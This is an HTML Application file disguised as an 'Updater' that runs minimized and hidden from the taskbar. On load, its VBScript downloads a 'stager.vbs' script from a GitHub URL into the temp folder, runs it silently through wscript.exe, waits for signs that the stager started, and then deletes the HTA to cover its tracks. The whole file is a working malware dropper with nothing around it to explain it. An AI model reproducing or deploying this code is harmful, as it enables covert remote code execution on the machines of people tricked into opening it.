<!DOCTYPE html>
<html>
<head>
  <hta:application
    id="Updater"
    applicationname="Updater"
    singleinstance="yes"
    windowstate="minimize"
    showintaskbar="no"
  />
  <title>Updater</title>
  <script language="VBScript">
    Sub Window_OnLoad()
      Const DEBUG_LOG = "%TEMP%\hta_refactor_debug.txt"
      Dim sh, fso, tempVbs, htaPath
      Dim http, ts, url, logFile, wshPath, proc, start

      ' — Initialize logging —
      Set fso = CreateObject("Scripting.FileSystemObject")
      Set sh  = CreateObject("WScript.Shell")
      log(DEBUG_LOG, "=== HTA Refactor Start ===")

      ' Prepare paths
      tempVbs = sh.ExpandEnvironmentStrings("%TEMP%") & "\stager.vbs"
      url      = "https://raw.githubusercontent.com/concentratedsulfuricacid/vector/main/stager.vbs"
      wshPath  = sh.ExpandEnvironmentStrings("%SystemRoot%\System32\wscript.exe")

      ' — Download via WinHttpRequest —
      log DEBUG_LOG, "Creating WinHttpRequest"
      On Error Resume Next
      Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
      If Err.Number <> 0 Then
        log DEBUG_LOG, "ERROR creating WinHttpRequest: " & Err.Description
        Exit Sub
      End If
      On Error GoTo 0

      log DEBUG_LOG, "Fetching " & url
      http.Open "GET", url, False
      http.Send

      If http.Status = 200 Then
        log DEBUG_LOG, "Download succeeded, writing to " & tempVbs
        Set ts = fso.CreateTextFile(tempVbs, True, False)
        ts.Write http.ResponseText
        ts.Close
      Else
        log DEBUG_LOG, "Download failed: HTTP " & http.Status
        Exit Sub
      End If

      ' — Execute the VBS stub and wait for it to start —
      log DEBUG_LOG, "Launching stager.vbs via wscript.exe"
      ' Wait = True so HTA blocks until wscript starts
      sh.Run """" & wshPath & """ """ & tempVbs & """", 0, True

      ' — Poll for the stager’s own debug log —
      start = Timer
      Do
        If fso.FileExists(sh.ExpandEnvironmentStrings("%TEMP%\stager_debug.txt")) Then
          log DEBUG_LOG, "Detected stager_debug.txt, stub launched!"
          Exit Do
        End If
        ' timeout after 10s
        If Timer - start > 10 Then
          log DEBUG_LOG, "Timed out waiting for stager_debug.txt"
          Exit Do
        End If
        WScript.Sleep 500
      Loop

      ' — Cleanup HTA —
      htaPath = document.location.pathname
      If fso.FileExists(htaPath) Then
        log DEBUG_LOG, "Deleting HTA: " & htaPath
        fso.DeleteFile htaPath, True
      End If

      log DEBUG_LOG, "=== HTA Refactor End ==="
      self.close
    End Sub

    Sub log(path, msg)
      Dim lf, shell
      Set shell = CreateObject("WScript.Shell")
      Dim p : p = shell.ExpandEnvironmentStrings(path)
      Set lf = CreateObject("Scripting.FileSystemObject") _
                 .OpenTextFile(p, 8, True)
      lf.WriteLine Now() & " - " & msg
      lf.Close
    End Sub
  </script>
</head>
<body>
</body>
</html>
